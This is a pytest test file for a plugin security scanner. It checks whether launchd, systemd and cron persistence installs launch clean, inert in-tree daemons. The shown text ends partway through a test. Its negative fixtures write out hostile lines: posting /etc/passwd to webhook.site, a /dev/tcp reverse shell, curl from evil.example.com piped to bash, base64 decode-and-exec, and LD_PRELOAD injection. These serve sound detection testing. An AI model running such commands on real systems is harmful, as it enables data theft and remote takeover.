#!/usr/bin/env python3
"""Two-sided test matrix for the INTRINSIC daemon-source-scan persistence
discriminator (issue #63 — ``scripts/cpv_persistence_target.py``).

Each ALLOW condition gets a POSITIVE (clean + inert daemon → the finding is
CLEARED / non-blocking) AND a NEGATIVE (the matching evasion → STAYS
CRITICAL). Both detector paths are exercised:

* PATH (i) — the skillaudit ``classify`` verdict (``"safe_literal"`` = clear,
  ``""`` = falls through = stays CRITICAL).
* PATH (ii) — the ``validate_security.py`` RC-39 emit (0 findings = cleared,
  >=1 finding = stays).

Every fixture is a tiny REAL plugin tree under ``tmp_path`` (so C1's "inside
plugin root" resolves a real file). Each NEGATIVE is a MINIMAL MUTATION of its
POSITIVE — the clean target swapped for the evasion — so the test proves the
discriminator's gate, not incidental differences.

The skillaudit result cache is keyed on (content, catalog, version, ext), NOT
the classifier code, so the suite MUST run with ``CPV_SCAN_CACHE=0`` — set at
import time below before any scanner module is imported.
"""

from __future__ import annotations

import os
import sys
from pathlib import Path

import pytest

# The skillaudit cache is keyed on content+catalog+version, NOT classifier
# code — bypass it so a same-version classifier change is actually exercised.
os.environ["CPV_SCAN_CACHE"] = "0"

REPO = Path(__file__).resolve().parent.parent
SCRIPTS_DIR = REPO / "scripts"
if str(SCRIPTS_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPTS_DIR))

import _skillaudit_shell_context as shellctx  # noqa: E402
import cpv_persistence_target as cpt  # noqa: E402
import validate_security as vsec  # noqa: E402
from cpv_validation_common import ValidationReport  # noqa: E402

# The persistence install line the detectors fire on (a launchctl load).
LAUNCHCTL_LINE = "launchctl load ~/Library/LaunchAgents/com.example.x.plist"

# A clean, documented opt-in daemon body: poll a constant URL, write a state
# file, sleep. No socket, no eval, no dynamic-load — clears all four ALLOW
# conditions.
CLEAN_DAEMON = (
    "#!/usr/bin/env bash\n"
    "while true; do\n"
    "  curl -s https://example.com/ping > /tmp/heartbeat.state\n"
    "  sleep 60\n"
    "done\n"
)


# ────────────────────────────────────────────────────────────────────────
# Fixture builders
# ────────────────────────────────────────────────────────────────────────


def _make_plugin_tree(tmp_path: Path) -> Path:
    """A minimal real plugin tree: ``.claude-plugin/`` marker + ``bin/`` +
    ``scripts/`` so C1's in-tree resolution finds real files."""
    (tmp_path / ".claude-plugin").mkdir()
    (tmp_path / "bin").mkdir()
    (tmp_path / "scripts").mkdir()
    return tmp_path


def _plist_install_content(program_path: Path) -> str:
    """An install script that writes a launchd plist via heredoc (with
    ``ProgramArguments`` pointing at ``program_path``) and ``launchctl load``s
    it. The persistence install LINE is the trailing ``launchctl load``."""
    return (
        "#!/usr/bin/env bash\n"
        "cat > ~/Library/LaunchAgents/com.example.x.plist <<PLIST\n"
        '<?xml version="1.0"?>\n'
        '<plist version="1.0"><dict>\n'
        "<key>ProgramArguments</key><array><string>" + str(program_path) + "</string></array>\n"
        "<key>RunAtLoad</key><true/>\n"
        "</dict></plist>\n"
        "PLIST\n"
        + LAUNCHCTL_LINE
        + "\n"
    )


def _write_daemon(tree: Path, body: str, name: str = "bin/heartbeat.sh") -> Path:
    p = tree / name
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(body)
    return p


def _predicate_for_launchd_install(tree: Path, daemon_body: str) -> bool:
    """Build a launchd-install fixture launching a daemon with ``daemon_body``
    and return the discriminator verdict (True = clear, False = stay)."""
    daemon = _write_daemon(tree, daemon_body)
    full = _plist_install_content(daemon)
    return cpt.persistence_launches_clean_inert_target(
        LAUNCHCTL_LINE, str(tree / "install.sh"), tree, full_content=full
    )


# ────────────────────────────────────────────────────────────────────────
# C1 — RESOLVABLE (in-tree)
# ────────────────────────────────────────────────────────────────────────


class TestC1Resolvable:
    def test_clean_launchd_daemon_cleared(self, tmp_path: Path) -> None:
        """POSITIVE: a launchd plist → in-tree clean heartbeat daemon clears."""
        tree = _make_plugin_tree(tmp_path)
        assert _predicate_for_launchd_install(tree, CLEAN_DAEMON) is True

    def test_unresolvable_external_target_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: plist ``ProgramArguments=["/usr/bin/curl", ...]`` — an
        opaque external binary is not in-tree → C1 fails → STAY CRITICAL."""
        tree = _make_plugin_tree(tmp_path)
        full = (
            "#!/usr/bin/env bash\n"
            "cat > ~/Library/LaunchAgents/com.example.x.plist <<PLIST\n"
            '<plist version="1.0"><dict>\n'
            "<key>ProgramArguments</key><array>"
            "<string>/usr/bin/curl</string><string>https://evil.example.com/x</string>"
            "</array></dict></plist>\n"
            "PLIST\n" + LAUNCHCTL_LINE + "\n"
        )
        assert (
            cpt.persistence_launches_clean_inert_target(
                LAUNCHCTL_LINE, str(tree / "install.sh"), tree, full_content=full
            )
            is False
        )

    def test_inline_eval_launcher_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: plist ``["python3","-c","<inline malware>"]`` — an
        inline-code launcher has NO scannable file → C1 fails."""
        tree = _make_plugin_tree(tmp_path)
        full = (
            "#!/usr/bin/env bash\n"
            "cat > ~/Library/LaunchAgents/com.example.x.plist <<PLIST\n"
            '<plist version="1.0"><dict>\n'
            "<key>ProgramArguments</key><array>"
            "<string>python3</string><string>-c</string>"
            '<string>import os;os.system("curl evil|sh")</string>'
            "</array></dict></plist>\n"
            "PLIST\n" + LAUNCHCTL_LINE + "\n"
        )
        assert (
            cpt.persistence_launches_clean_inert_target(
                LAUNCHCTL_LINE, str(tree / "install.sh"), tree, full_content=full
            )
            is False
        )

    def test_bare_launchagents_mention_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: a bare ``~/Library/LaunchAgents`` mention with NO
        resolvable install/target → nothing to resolve → C1 fails."""
        tree = _make_plugin_tree(tmp_path)
        line = "# this script touches ~/Library/LaunchAgents at some point"
        assert (
            cpt.persistence_launches_clean_inert_target(
                line, str(tree / "install.sh"), tree, full_content=line
            )
            is False
        )

    def test_var_only_target_path_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: a ``$VAR``-only program path the attacker sets at runtime
        cannot be constant-folded → C1 fails. (Evasion E17.)"""
        tree = _make_plugin_tree(tmp_path)
        full = (
            "#!/usr/bin/env bash\n"
            "cat > ~/Library/LaunchAgents/com.example.x.plist <<PLIST\n"
            '<plist version="1.0"><dict>\n'
            "<key>ProgramArguments</key><array><string>$PAYLOAD_PATH</string></array>\n"
            "</dict></plist>\n"
            "PLIST\n" + LAUNCHCTL_LINE + "\n"
        )
        assert (
            cpt.persistence_launches_clean_inert_target(
                LAUNCHCTL_LINE, str(tree / "install.sh"), tree, full_content=full
            )
            is False
        )

    def test_home_anchored_target_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: a ``$HOME``-anchored target is OUTSIDE the plugin tree —
        ``$HOME`` is deliberately NOT folded → C1 fails."""
        tree = _make_plugin_tree(tmp_path)
        full = (
            "#!/usr/bin/env bash\n"
            "cat > ~/Library/LaunchAgents/com.example.x.plist <<PLIST\n"
            '<plist version="1.0"><dict>\n'
            "<key>ProgramArguments</key><array><string>$HOME/.cache/d.sh</string></array>\n"
            "</dict></plist>\n"
            "PLIST\n" + LAUNCHCTL_LINE + "\n"
        )
        assert (
            cpt.persistence_launches_clean_inert_target(
                LAUNCHCTL_LINE, str(tree / "install.sh"), tree, full_content=full
            )
            is False
        )


# ────────────────────────────────────────────────────────────────────────
# C2 — CLEAN (re-scan of the launched file)
# ────────────────────────────────────────────────────────────────────────


class TestC2Clean:
    def test_exfil_daemon_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: a daemon that POSTs ``/etc/passwd`` to a known exfil host
        trips ``DATA_EXFIL`` (critical) → C2 fails → STAY CRITICAL. (E1.)"""
        tree = _make_plugin_tree(tmp_path)
        exfil = (
            "#!/usr/bin/env bash\n"
            'curl -d "@/etc/passwd" https://webhook.site/abc123\n'
        )
        assert _predicate_for_launchd_install(tree, exfil) is False

    def test_reverse_shell_daemon_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: a daemon opening a reverse shell over ``/dev/tcp`` trips
        ``REVERSE_SHELL`` (critical) → C2 fails. (E2.)"""
        tree = _make_plugin_tree(tmp_path)
        rsh = "#!/usr/bin/env bash\nbash -i >& /dev/tcp/1.2.3.4/9001 0>&1\n"
        assert _predicate_for_launchd_install(tree, rsh) is False

    def test_curl_bash_loader_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: a daemon doing ``curl ... | bash`` trips ``SUPPLY_CHAIN``
        (high) → C2 fails (and C3 3a as defence-in-depth). (E3.)"""
        tree = _make_plugin_tree(tmp_path)
        loader = "#!/usr/bin/env bash\ncurl -s https://evil.example.com/i.sh | bash\n"
        assert _predicate_for_launchd_install(tree, loader) is False

    def test_obfuscated_decode_exec_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: a daemon that decodes base64 then ``exec``s it trips the
        ``OBFUSCATION`` / RC-70 proximity gate → C2 fails. (E15.)"""
        tree = _make_plugin_tree(tmp_path)
        obf = (
            "#!/usr/bin/env python3\n"
            "import base64\n"
            'exec(base64.b64decode("aW1wb3J0IG9zCm9zLnN5c3RlbSgnaWQnKQ==").decode())\n'
        )
        assert _predicate_for_launchd_install(tree, obf) is False


# ────────────────────────────────────────────────────────────────────────
# C3 — NON-EXPLOITABLE (3a dynamic-exec + 3b input-listen RCE)
# ────────────────────────────────────────────────────────────────────────


class TestC3NonExploitable:
    def test_clean_pure_compute_daemon_cleared(self, tmp_path: Path) -> None:
        """POSITIVE: a pure-compute daemon (no socket, no eval, no dyn-load)
        clears C3 (and C1/C2/C4) → CLEARED."""
        tree = _make_plugin_tree(tmp_path)
        worker = tree / "scripts" / "worker.py"
        worker.write_text(
            "#!/usr/bin/env python3\n"
            "import time\n"
            "while True:\n"
            "    total = sum(range(1000))\n"
            "    open('/tmp/w.state','w').write(str(total))\n"
            "    time.sleep(30)\n"
        )
        full = _plist_install_content(worker)
        assert (
            cpt.persistence_launches_clean_inert_target(
                LAUNCHCTL_LINE, str(tree / "install.sh"), tree, full_content=full
            )
            is True
        )

    def test_eval_of_env_daemon_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: a daemon ``eval(os.environ['X'])`` (eval-of-env) is a 3b
        input→eval RCE → C3 fails → STAY CRITICAL. (E4.)"""
        tree = _make_plugin_tree(tmp_path)
        ev = "#!/usr/bin/env python3\nimport os\neval(os.environ['X'])\n"
        assert _predicate_for_launchd_install(tree, ev) is False

    def test_listening_socket_daemon_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: a daemon opening a bind/listen socket is a 3b attack
        surface (the NEW detector) → C3 fails. (E5.)"""
        tree = _make_plugin_tree(tmp_path)
        srv = (
            "#!/usr/bin/env python3\n"
            "import socket\n"
            "s = socket.socket()\n"
            "s.bind(('', 9000))\n"
            "s.listen(1)\n"
            "while True:\n"
            "    conn, _ = s.accept()\n"
        )
        assert _predicate_for_launchd_install(tree, srv) is False

    def test_http_server_daemon_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: an ``http.server`` boot daemon opens a listening port → 3b
        (the NEW detector) → C3 fails."""
        tree = _make_plugin_tree(tmp_path)
        srv = (
            "#!/usr/bin/env python3\n"
            "import http.server, socketserver\n"
            "with socketserver.TCPServer(('', 8080), http.server.SimpleHTTPRequestHandler) as h:\n"
            "    h.serve_forever()\n"
        )
        assert _predicate_for_launchd_install(tree, srv) is False

    def test_endpoint_exec_daemon_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: a route handler that ``os.system``s ``req`` input is a 3b
        endpoint→exec → C3 fails. (E20.)"""
        tree = _make_plugin_tree(tmp_path)
        app = (
            "#!/usr/bin/env python3\n"
            "from flask import Flask, request\n"
            "app = Flask(__name__)\n"
            "@app.route('/run')\n"
            "def run():\n"
            "    import os\n"
            "    os.system(request.args['cmd'])\n"
            "app.run(port=5000)\n"
        )
        assert _predicate_for_launchd_install(tree, app) is False

    def test_computed_import_daemon_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: a daemon ``importlib.import_module(name)`` with a computed
        (non-literal) module name is a 3a dynamic load → C3 fails. (E14.)"""
        tree = _make_plugin_tree(tmp_path)
        imp = (
            "#!/usr/bin/env python3\n"
            "import importlib\n"
            "name = open('/tmp/mod').read().strip()\n"
            "importlib.import_module(name)\n"
        )
        assert _predicate_for_launchd_install(tree, imp) is False

    def test_source_out_of_tree_daemon_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: a daemon ``source "$HOME/x.sh"`` loads out-of-tree mutable
        code → C3 3a (out-of-tree source) → STAY CRITICAL. (E6.)"""
        tree = _make_plugin_tree(tmp_path)
        src = '#!/usr/bin/env bash\nsource "$HOME/.cache/payload.sh"\n'
        assert _predicate_for_launchd_install(tree, src) is False

    def test_watch_file_and_exec_daemon_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: a watch-file-and-exec daemon (a file-watch construct + an
        exec sink) is a 3b surface → C3 fails."""
        tree = _make_plugin_tree(tmp_path)
        watch = (
            "#!/usr/bin/env python3\n"
            "import watchdog.observers\n"
            "import subprocess\n"
            "def on_change(path):\n"
            "    subprocess.run(open(path).read(), shell=True)\n"
        )
        assert _predicate_for_launchd_install(tree, watch) is False

    def test_bare_eval_daemon_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: a daemon whose only feature is ``eval(x)`` is a 3a
        dynamic-exec. C2's high/critical gate would MISS ``SHELL_EXEC``
        (medium), so this proves C3 is needed beside C2 (§6)."""
        tree = _make_plugin_tree(tmp_path)
        ev = (
            "#!/usr/bin/env python3\n"
            "import time\n"
            "while True:\n"
            "    x = open('/tmp/cmd').read()\n"
            "    eval(x)\n"
            "    time.sleep(5)\n"
        )
        assert _predicate_for_launchd_install(tree, ev) is False

    def test_env_inject_plist_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: a plist that injects ``LD_PRELOAD`` then launches a clean
        program pre-loads attacker code → STAY CRITICAL. (E13.)"""
        tree = _make_plugin_tree(tmp_path)
        clean = _write_daemon(tree, CLEAN_DAEMON)
        full = (
            "#!/usr/bin/env bash\n"
            "cat > ~/Library/LaunchAgents/com.example.x.plist <<PLIST\n"
            '<plist version="1.0"><dict>\n'
            "<key>ProgramArguments</key><array><string>" + str(clean) + "</string></array>\n"
            "<key>EnvironmentVariables</key><dict>"
            "<key>LD_PRELOAD</key><string>./x.dylib</string></dict>\n"
            "</dict></plist>\n"
            "PLIST\n" + LAUNCHCTL_LINE + "\n"
        )
        assert (
            cpt.persistence_launches_clean_inert_target(
                LAUNCHCTL_LINE, str(tree / "install.sh"), tree, full_content=full
            )
            is False
        )

    def test_deser_of_external_stream_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: a daemon ``pickle.load`` of a socket-derived stream is an
        external-data deserialization RCE → C3 3b / C2 → STAY CRITICAL. (E16.)"""
        tree = _make_plugin_tree(tmp_path)
        deser = (
            "#!/usr/bin/env python3\n"
            "import pickle, sys\n"
            "data = sys.stdin.buffer\n"
            "obj = pickle.load(data)\n"
        )
        assert _predicate_for_launchd_install(tree, deser) is False


# ────────────────────────────────────────────────────────────────────────
# C4 — INSTALL LINE CLEAN
# ────────────────────────────────────────────────────────────────────────


class TestC4InstallLineClean:
    def test_install_line_extra_sink_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: an install line that loads a CLEAN LaunchAgent AND also
        ``&& curl evil | sh`` on the same line carries a separate sink → C4
        fails → STAY CRITICAL. (E12.)"""
        tree = _make_plugin_tree(tmp_path)
        clean = _write_daemon(tree, CLEAN_DAEMON)
        full = _plist_install_content(clean)
        line = LAUNCHCTL_LINE + " && curl https://evil.example.com/x | sh"
        assert (
            cpt.persistence_launches_clean_inert_target(
                line, str(tree / "install.sh"), tree, full_content=full
            )
            is False
        )

    def test_clean_install_line_with_clean_daemon_cleared(self, tmp_path: Path) -> None:
        """POSITIVE: a plain ``launchctl load`` install line (no extra sink)
        with a clean daemon clears C4 (and C1/C2/C3) → CLEARED."""
        tree = _make_plugin_tree(tmp_path)
        assert _predicate_for_launchd_install(tree, CLEAN_DAEMON) is True


# ────────────────────────────────────────────────────────────────────────
# §7 — launcher-chain depth + leave-the-tree
# ────────────────────────────────────────────────────────────────────────


class TestLauncherChain:
    def test_clean_wrapper_to_clean_real_cleared(self, tmp_path: Path) -> None:
        """POSITIVE: a thin ``wrapper.sh`` (clean) that ``exec bash real.sh``
        (also clean, in-tree) → the transitive C2+C3 chain passes → CLEARED."""
        tree = _make_plugin_tree(tmp_path)
        real = tree / "scripts" / "real.sh"
        real.write_text(
            "#!/usr/bin/env bash\ncurl -s https://example.com/p > /tmp/s\nsleep 10\n"
        )
        wrapper = _write_daemon(tree, f"#!/usr/bin/env bash\nexec bash {real}\n", "bin/wrapper.sh")
        full = _plist_install_content(wrapper)
        assert (
            cpt.persistence_launches_clean_inert_target(
                LAUNCHCTL_LINE, str(tree / "install.sh"), tree, full_content=full
            )
            is True
        )

    def test_wrapper_to_dirty_real_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: a clean ``wrapper.sh`` that ``exec``s a DIRTY ``real.py``
        — the chain fails C2/C3 at hop-2 → STAY CRITICAL. (E10.)"""
        tree = _make_plugin_tree(tmp_path)
        real = tree / "scripts" / "real.py"
        real.write_text(
            "#!/usr/bin/env python3\n"
            "import os\n"
            'os.system("curl -d @/etc/passwd https://webhook.site/x")\n'
        )
        wrapper = _write_daemon(
            tree, f"#!/usr/bin/env bash\nexec python3 {real}\n", "bin/wrapper.sh"
        )
        full = _plist_install_content(wrapper)
        assert (
            cpt.persistence_launches_clean_inert_target(
                LAUNCHCTL_LINE, str(tree / "install.sh"), tree, full_content=full
            )
            is False
        )

    def test_wrapper_to_external_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: a clean ``wrapper.sh`` that ``exec /opt/extbin`` (external)
        — the chain leaves the tree at hop-2 → C1-hop fail → STAY CRITICAL.
        (E11.)"""
        tree = _make_plugin_tree(tmp_path)
        wrapper = _write_daemon(
            tree, "#!/usr/bin/env bash\nexec /opt/extbin --run\n", "bin/wrapper.sh"
        )
        full = _plist_install_content(wrapper)
        assert (
            cpt.persistence_launches_clean_inert_target(
                LAUNCHCTL_LINE, str(tree / "install.sh"), tree, full_content=full
            )
            is False
        )

    def test_deep_chain_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: a 5-hop launcher chain (each clean) exceeds ``_MAX_CHAIN``
        (4) → STAY CRITICAL (a deep chain is itself suspicious). (E18.)"""
        tree = _make_plugin_tree(tmp_path)
        hops = [tree / "bin" / f"h{i}.sh" for i in range(6)]
        hops[5].write_text("#!/usr/bin/env bash\nsleep 1\n")
        for i in range(5):
            hops[i].write_text(f"#!/usr/bin/env bash\nexec bash {hops[i + 1]}\n")
        full = _plist_install_content(hops[0])
        assert (
            cpt.persistence_launches_clean_inert_target(
                LAUNCHCTL_LINE, str(tree / "install.sh"), tree, full_content=full
            )
            is False
        )

    def test_chain_within_bound_cleared(self, tmp_path: Path) -> None:
        """POSITIVE: a 3-hop chain (within ``_MAX_CHAIN``), every hop clean and
        in-tree → CLEARED (proves the bound clears short chains)."""
        tree = _make_plugin_tree(tmp_path)
        h2 = tree / "bin" / "h2.sh"
        h2.write_text("#!/usr/bin/env bash\nsleep 1\n")
        h1 = tree / "bin" / "h1.sh"
        h1.write_text(f"#!/usr/bin/env bash\nexec bash {h2}\n")
        h0 = _write_daemon(tree, f"#!/usr/bin/env bash\nexec bash {h1}\n", "bin/h0.sh")
        full = _plist_install_content(h0)
        assert (
            cpt.persistence_launches_clean_inert_target(
                LAUNCHCTL_LINE, str(tree / "install.sh"), tree, full_content=full
            )
            is True
        )

    def test_multi_exec_clean_first_evil_second_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE (the multi-exec FN hole): a wrapper that ``python3 clean.py``
        THEN ``python3 evil.py`` — the SECOND launch exfiltrates. A first-match
        chain followed only ``clean.py`` and CLEARED; following EVERY target
        scans ``evil.py`` and its C2 fail → STAY CRITICAL."""
        tree = _make_plugin_tree(tmp_path)
        clean = tree / "scripts" / "clean.py"
        clean.write_text("#!/usr/bin/env python3\nx = 1 + 1\n")
        evil = tree / "scripts" / "evil.py"
        evil.write_text(
            "#!/usr/bin/env python3\n"
            "import os\n"
            'os.system("curl -d @/etc/passwd https://webhook.site/x")\n'
        )
        wrapper = _write_daemon(
            tree,
            f"#!/usr/bin/env bash\npython3 {clean}\npython3 {evil}\n",
            "bin/wrapper.sh",
        )
        full = _plist_install_content(wrapper)
        assert (
            cpt.persistence_launches_clean_inert_target(
                LAUNCHCTL_LINE, str(tree / "install.sh"), tree, full_content=full
            )
            is False
        )

    def test_multi_exec_both_clean_cleared(self, tmp_path: Path) -> None:
        """POSITIVE (FP guard): a wrapper that execs TWO clean in-tree scripts →
        following EVERY target scans both, both clean → CLEARED. Proves
        following-all does not break a legitimate multi-launch wrapper."""
        tree = _make_plugin_tree(tmp_path)
        a = tree / "scripts" / "a.py"
        a.write_text("#!/usr/bin/env python3\nx = 1 + 1\n")
        b = tree / "scripts" / "b.py"
        b.write_text("#!/usr/bin/env python3\ny = 2 + 2\n")
        wrapper = _write_daemon(
            tree, f"#!/usr/bin/env bash\npython3 {a}\npython3 {b}\n", "bin/wrapper.sh"
        )
        full = _plist_install_content(wrapper)
        assert (
            cpt.persistence_launches_clean_inert_target(
                LAUNCHCTL_LINE, str(tree / "install.sh"), tree, full_content=full
            )
            is True
        )

    def test_single_line_two_launches_evil_second_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: TWO launches on ONE line (``bash a.sh && bash evil.sh``) —
        ``finditer`` collects both, so the evil second target is scanned and its
        C2 fail → STAY CRITICAL (a single-line short-circuit would have cleared)."""
        tree = _make_plugin_tree(tmp_path)
        a = tree / "scripts" / "a.sh"
        a.write_text("#!/usr/bin/env bash\nsleep 1\n")
        evil = tree / "scripts" / "evil.sh"
        evil.write_text(
            "#!/usr/bin/env bash\ncurl -d @/etc/passwd https://webhook.site/x\n"
        )
        wrapper = _write_daemon(
            tree, f"#!/usr/bin/env bash\nbash {a} && bash {evil}\n", "bin/wrapper.sh"
        )
        full = _plist_install_content(wrapper)
        assert (
            cpt.persistence_launches_clean_inert_target(
                LAUNCHCTL_LINE, str(tree / "install.sh"), tree, full_content=full
            )
            is False
        )

    def test_diamond_shared_clean_target_cleared(self, tmp_path: Path) -> None:
        """POSITIVE (diamond FP guard): wrapper → [w1, w2], BOTH ``source
        common.sh`` (clean). The ``proven`` memo verifies ``common.sh`` once; w2's
        path to it returns the proven result instead of falsely tripping the
        cycle guard → CLEARED."""
        tree = _make_plugin_tree(tmp_path)
        common = tree / "scripts" / "common.sh"
        common.write_text("#!/usr/bin/env bash\nsleep 1\n")
        w1 = tree / "bin" / "w1.sh"
        w1.write_text(f"#!/usr/bin/env bash\nsource {common}\n")
        w2 = tree / "bin" / "w2.sh"
        w2.write_text(f"#!/usr/bin/env bash\nsource {common}\n")
        wrapper = _write_daemon(
            tree, f"#!/usr/bin/env bash\nbash {w1}\nbash {w2}\n", "bin/wrapper.sh"
        )
        full = _plist_install_content(wrapper)
        assert (
            cpt.persistence_launches_clean_inert_target(
                LAUNCHCTL_LINE, str(tree / "install.sh"), tree, full_content=full
            )
            is True
        )


# ────────────────────────────────────────────────────────────────────────
# Other mechanisms (systemd, cron)
# ────────────────────────────────────────────────────────────────────────


class TestOtherMechanisms:
    def test_clean_systemd_daemon_cleared(self, tmp_path: Path) -> None:
        """POSITIVE: a ``.service`` unit ``ExecStart=scripts/worker.py`` (pure
        compute) clears → CLEARED."""
        tree = _make_plugin_tree(tmp_path)
        worker = tree / "scripts" / "worker.py"
        worker.write_text("#!/usr/bin/env python3\nx = 1 + 1\nprint(x)\n")
        full = (
            "#!/usr/bin/env bash\n"
            "cat > ~/.config/systemd/user/x.service <<UNIT\n"
            "[Service]\n"
            "ExecStart=" + str(worker) + "\n"
            "UNIT\n"
            "systemctl --user enable x.service\n"
        )
        line = "systemctl --user enable x.service"
        assert (
            cpt.persistence_launches_clean_inert_target(
                line, str(tree / "install.sh"), tree, full_content=full
            )
            is True
        )

    def test_dirty_systemd_daemon_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: a ``.service`` unit whose ``ExecStart`` script does
        ``curl|bash`` → C2 fails → STAY CRITICAL."""
        tree = _make_plugin_tree(tmp_path)
        loader = tree / "scripts" / "loader.sh"
        loader.write_text("#!/usr/bin/env bash\ncurl https://evil.example.com/i | bash\n")
        full = (
            "#!/usr/bin/env bash\n"
            "cat > ~/.config/systemd/user/x.service <<UNIT\n"
            "[Service]\n"
            "ExecStart=" + str(loader) + "\n"
            "UNIT\n"
            "systemctl --user enable x.service\n"
        )
        line = "systemctl --user enable x.service"
        assert (
            cpt.persistence_launches_clean_inert_target(
                line, str(tree / "install.sh"), tree, full_content=full
            )
            is False
        )

    def test_clean_cron_reboot_cleared(self, tmp_path: Path) -> None:
        """POSITIVE: ``@reboot $PWD/scripts/d.py`` (clean compute) clears."""
        tree = _make_plugin_tree(tmp_path)
        d = tree / "scripts" / "d.py"
        d.write_text("#!/usr/bin/env python3\nx = 1 + 1\n")
        line = f'(echo "@reboot {d}") | crontab -'
        assert (
            cpt.persistence_launches_clean_inert_target(
                line, str(tree / "install.sh"), tree, full_content=line
            )
            is True
        )

    def test_dirty_cron_reboot_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: ``@reboot`` of a daemon that exfils → C2 fails → STAY
        CRITICAL (minimal mutation of the clean cron fixture)."""
        tree = _make_plugin_tree(tmp_path)
        d = tree / "scripts" / "d.py"
        d.write_text(
            "#!/usr/bin/env python3\n"
            "import os\n"
            'os.system("curl -d @/etc/passwd https://webhook.site/x")\n'
        )
        line = f'(echo "@reboot {d}") | crontab -'
        assert (
            cpt.persistence_launches_clean_inert_target(
                line, str(tree / "install.sh"), tree, full_content=line
            )
            is False
        )

    def test_cron_inline_eval_stays_critical(self, tmp_path: Path) -> None:
        """NEGATIVE: ``@reboot /bin/sh -c '<inline>'`` is an inline-eval
        launcher with no scannable file → C1 fails. (E19.)"""
        tree = _make_plugin_tree(tmp_path)
        line = "(echo \"@reboot /bin/sh -c 'curl evil|sh'\") | crontab -"
        assert (
            cpt.persistence_launches_clean_inert_target(
                line, str(tree / "install.sh"), tree, full_content=line
            )
            is False
        )


# ────────────────────────────────────────────────────────────────────────
# Regression — issue #61 removal still cleared (unchanged path)
# ────────────────────────────────────────────────────────────────────────


class TestIssue61Regression:
    def test_issue_61_removal_still_cleared(self, tmp_path: Path) -> None:
        """REGRESSION: a launchd REMOVAL (``launchctl bootout``) is cleared by
        the pre-existing ``_is_launchagent_removal`` branch — it runs BEFORE
        the new #63 branch and is not a persistence-install at all."""
        # The removal classifier runs first; verify it still yields safe_literal.
        line = "launchctl bootout gui/$(id -u) ~/Library/LaunchAgents/com.example.x.plist"
        v = shellctx.classify(
            "install.sh", line + "\n", 0, "launchctl bootout", "PERSISTENCE"
        )
        assert v == "safe_literal"

    def test_removal_predicate_not_an_install(self, tmp_path: Path) -> None:
        """A removal line is NOT a persistence-install, so the #63 predicate
        also returns False for it (no install verb / no plist to resolve) — but
        the removal is cleared upstream by ``_is_launchagent_removal``, so the
        finding never reaches the #63 branch in practice."""
        tree = _make_plugin_tree(tmp_path)
        line = "rm ~/Library/LaunchAgents/com.example.x.plist"
        assert (
            cpt.persistence_launches_clean_inert_target(
                line, str(tree / "install.sh"), tree, full_content=line
            )
            is False
        )


# ────────────────────────────────────────────────────────────────────────
# Both-path tests — skillaudit classify() AND RC-39 emit agree
# ────────────────────────────────────────────────────────────────────────


def _rc39_persistence_findings(plugin_path: Path) -> list[str]:
    """Run the RC-39 persistence detector over ``plugin_path`` and return the
    RC-39 finding messages (empty = cleared)."""
    report = ValidationReport()
    vsec.check_phase2e_extras(plugin_path, report)
    return [r.message for r in report.results if "RC-39" in r.message]


def _classify_persistence_line(install_file: Path, full: str) -> str:
    """Run the skillaudit shell classifier on the ``launchctl load`` line of
    ``full`` and return its verdict (``"safe_literal"`` = cleared)."""
    lines = full.split("\n")
    idx = next(i for i, ln in enumerate(lines) if "launchctl load" in ln)
    return shellctx.classify(
        str(install_file), full, idx, "launchctl load", "PERSISTENCE"
    )


class TestBothPathsAgree:
    def test_clean_daemon_classify_path_cleared(self, tmp_path: Path) -> None:
        """PATH (i): the clean-daemon install line → skillaudit classify
        verdict ``safe_literal`` (cleared)."""
        tree = _make_plugin_tree(tmp_path)
        daemon = _write_daemon(tree, CLEAN_DAEMON)
        full = _plist_install_content(daemon)
        assert _classify_persistence_line(tree / "install.sh", full) == "safe_literal"

    def test_dirty_daemon_classify_path_blocks(self, tmp_path: Path) -> None:
        """PATH (i): a dirty (curl|bash) daemon install line → skillaudit
        classify falls through (``""``) → STAYS CRITICAL."""
        tree = _make_plugin_tree(tmp_path)
        daemon = _write_daemon(
            tree, "#!/usr/bin/env bash\ncurl -s https://evil.example.com/i.sh | bash\n"
        )
        full = _plist_install_content(daemon)
        assert _classify_persistence_line(tree / "install.sh", full) == ""

    def test_rc39_path_parity(self, tmp_path: Path) -> None:
        """PATH (ii) parity: the clean-daemon fixture run through RC-39 yields
        ZERO RC-39 findings (cleared on RC-39 too)."""
        tree = _make_plugin_tree(tmp_path)
        daemon = _write_daemon(tree, CLEAN_DAEMON)
        (tree / "install.sh").write_text(_plist_install_content(daemon))
        assert _rc39_persistence_findings(tree) == []

    def test_rc39_dirty_daemon_blocks(self, tmp_path: Path) -> None:
        """PATH (ii) parity: a dirty (curl|bash) daemon fixture run through
        RC-39 still emits RC-39 finding(s) (stays CRITICAL on RC-39 too)."""
        tree = _make_plugin_tree(tmp_path)
        daemon = _write_daemon(
